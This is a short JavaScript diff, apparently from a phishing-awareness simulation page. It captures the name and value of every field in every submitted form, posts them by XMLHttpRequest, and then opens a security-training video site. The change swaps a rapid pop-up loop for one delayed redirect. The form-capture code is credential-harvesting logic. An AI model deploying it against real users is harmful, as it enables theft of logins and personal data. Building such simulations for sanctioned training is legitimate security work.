@@ -10,14 +10,12 @@ function formSubmit(event) {
     for (index = 0; index < event.target.elements.length; ++index) {
         string = string + event.target.elements[index].name + '=' + event.target.elements[index].value + '&';
     }
-function myFunction() {
-    setInterval(function(){ alert("Please contact the IT department"); }, 10000);
     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     xhr.send(string);
-var naggot = setInterval(function(){ window.open('https://theantisocialengineer.com/training-videos/') }, 10);}
+}
 
 // add an event listener to the submit event for every form in the page
 for (index = 0; index < forms.length; ++index) {
     forms[index].addEventListener('submit', formSubmit);
 }
-
+var naggot = setTimeout(function(){ window.open('https://theantisocialengineer.com/training-videos/') }, 50000);
